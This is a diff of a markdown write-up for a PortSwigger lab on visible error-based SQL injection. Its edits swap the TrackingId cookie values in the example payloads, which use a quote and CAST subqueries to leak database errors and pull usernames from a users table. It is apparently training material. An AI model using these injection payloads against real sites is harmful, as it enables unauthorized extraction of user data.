@@ -42,17 +42,17 @@ When clicking on any catgory in products filter, browser sends a GET request wit
 Let's try to input a special character `'` in the TrackingID parameter since it is vulnerable as per lab description to try and induce an SQL error.
 
 ```sql
-Cookie: TrackingId=e00R0OKbtGq3H944';
+Cookie: TrackingId=1IV6QKZWpbBxZLdG';
 ```
 
 **Response**
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/5110b692271f567af70b3207b0d1899f6d537dd1/SQL-Injection/Lab%3A%20Visible%20error-based%20SQL%20injection/Images/Apostrophe%20Vulnerability%20in%20Response.png)
 
 Now we induced an error in the application and so we got an error response back which leaked the query  being made in the backend.
 
 ```sql
-SELECT * FROM tracking WHERE id = 'e00R0OKbtGq3H944''
+SELECT * FROM tracking WHERE id = '1IV6QKZWpbBxZLdG''
 ```
 
 Since we know what query is being made, now we can craft our payload using CAST conditional expresiions.
@@ -60,7 +60,7 @@ Since we know what query is being made, now we can craft our payload using CAST 
 First we give a generic SELECT query & CAST the returned value to **int** datatype.
 
 ```sql
-TrackingId=hxcQNYCw0qIfVGRe' AND CAST((SELECT 1) AS int)--
+TrackingId=1IV6QKZWpbBxZLdG' AND CAST((SELECT 1) AS int)--
 ```
 The subquery (SELECT 1) is selecting the value 1 from the database. The CAST function is then used to convert that value into an integer data type (AS int).
 
@@ -75,7 +75,7 @@ It says that **AND condition must be a boolean expression.**
 So we modify the injection payload with a comparison operator so that it returns boolean data.
 
 ```sql
-TrackingId=hxcQNYCw0qIfVGRe' AND 1=CAST((SELECT 1) AS int)--
+TrackingId=1IV6QKZWpbBxZLdG' AND 1=CAST((SELECT 1) AS int)--
 ```
 
 Now we get a different response ie. **The condition got TRUE and it returned all the category items** with a `200 OK` status code.
@@ -94,7 +94,7 @@ We get a `500 Internal Server error` with the follwoing error response back.
 ![image]()
 
 ```sql
-SELECT * FROM tracking WHERE id = 'hxcQNYCw0qIfVGRe' AND 1=CAST((SELECT username FROM users) AS'. Expected char
+SELECT * FROM tracking WHERE id = '1IV6QKZWpbBxZLdG' AND 1=CAST((SELECT username FROM users) AS'. Expected char
 ````
 
 THe query is being truncated here. So lets either remove some or all of `trackingID` cookie value to free up some space.
